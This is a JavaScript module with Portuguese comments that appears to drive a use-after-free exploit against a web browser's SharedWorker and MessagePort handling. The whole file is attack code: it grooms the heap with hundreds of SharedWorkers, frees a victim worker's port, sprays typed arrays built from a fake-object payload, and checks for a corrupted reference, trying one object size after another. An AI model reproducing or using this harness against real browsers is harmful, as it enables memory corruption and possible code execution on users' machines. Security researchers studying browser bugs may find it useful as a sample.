import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_heap_grooming } from './heap.mjs';
import { build_fake_object } from './payloads.mjs';

var workers_stash = [];
var current_test_idx = 0;

// Inicia o ciclo de testes
export async function start_auto_test() {
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
    
    log(">>> INICIANDO FUZZER DE MEMÓRIA (403) <<<", "success");
    
    // 1. Preparar Memória (Uma vez para todos)
    prepare_heap_grooming();
    
    // 2. Grooming Base (Workers estáticos)
    log("Grooming Base (0-390)...");
    for (let i = 0; i < 390; i++) {
        try {
            let w = new SharedWorker("data:text/javascript,1", "g" + i);
            w.port.start();
            workers_stash.push(w);
        } catch (e) {}
    }

    // Começa a testar os tamanhos um por um
    test_next_size();
}

function test_next_size() {
    if (current_test_idx >= CONFIG.SIZES_TO_TEST.length) {
        log("FIM DOS TESTES. Nenhum tamanho funcionou.", "fail");
        alert("Fim dos testes. Tente recarregar a página.");
        return;
    }

    const size = CONFIG.SIZES_TO_TEST[current_test_idx];
    log(`[...] Testando Tamanho: 0x${size.toString(16).toUpperCase()} (${size} bytes)`);

    // Constrói payload específico para este tamanho
    const payload = build_fake_object(size);
    
    // Executa o Trigger
    run_trigger_sequence(payload, size);
}

function run_trigger_sequence(payload, size) {
    // Precisamos criar novos workers para chegar na zona de pressão (390 -> 403)
    let p_count = 0;
    let pressure_workers = [];
    const limit = CONFIG.WORKER_LIMIT - 390; // Ex: 403 - 390 = 13

    const interval = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval);
            
            // O último worker criado é a vítima (403)
            const victim = pressure_workers.pop();
            
            // Tenta o exploit
            const success = attempt_exploit(victim, payload, size);
            
            // Limpeza para o próximo teste
            cleanup_round(pressure_workers);
            
            if (!success) {
                current_test_idx++;
                // Pequena pausa antes do próximo tamanho
                setTimeout(test_next_size, 1000);
            }
            return;
        }

        try {
            let id = "test_" + size + "_" + p_count;
            let w = new SharedWorker("data:text/javascript,1", id);
            w.port.start();
            pressure_workers.push(w);
        } catch(e) {}
        
        p_count++;
    }, 50); // Rápido
}

function attempt_exploit(victim, payload, size) {
    const port_ref = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY
    const spray = [];
    for (let k = 0; k < 5000; k++) { // Spray menor para ser rápido
        spray.push(new Uint32Array(payload));
    }

    // 3. VERIFICAÇÃO
    try {
        const check = port_ref.toString();
        if (check.indexOf("MessagePort") === -1) {
            log(`!!! BINGO !!! Tamanho Correto: 0x${size.toString(16)}`, "success");
            log("Objeto corrompido detectado!", "success");
            alert(`SUCESSO! Tamanho: 0x${size.toString(16)}`);
            return true; // Para os testes
        } else {
            // Falhou, tenta forçar só pra garantir
            port_ref.postMessage("TRY");
        }
    } catch (e) {
        log(`Crash/Erro no tamanho 0x${size.toString(16)}: ${e}`, "warn");
    }
    
    return false; // Continua para o próximo
}

function cleanup_round(workers) {
    // Fecha os workers usados nesta rodada para liberar espaço
    workers.forEach(w => w.port.close());
}

// Auto-start ao carregar o módulo? Não, vamos esperar o clique.
document.getElementById("btn_run").addEventListener("click", start_auto_test);
